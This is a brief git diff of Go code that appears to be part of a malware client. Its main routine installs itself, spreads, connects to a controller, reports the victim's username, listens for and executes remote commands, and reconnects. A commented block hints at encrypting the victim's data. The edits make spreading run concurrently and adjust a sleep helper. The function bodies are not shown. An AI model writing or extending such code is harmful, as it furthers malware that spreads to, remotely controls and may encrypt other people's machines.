@@ -21,11 +21,13 @@ func main() {
 	//Check if already running
 	CheckMultiInstances()
 	Install()
-	Spread()
+	go Spread()
 	c, _ = Connect()
 	Send("user", GetUsername())
 	go ListenAndExecute()
 	go Reconnect()
+
+	//SendData("Ok from client using cap'p")
 
 	/*if ReadRegDone() {
 		//Already encrypted
@@ -85,6 +87,6 @@ func ParseProtocol(r string) {
 }
 
 // Wait waits 30 seconds
-func Wait(s int) {
+func Wait(s time.Duration) {
 	time.Sleep(s * time.Second)
 }
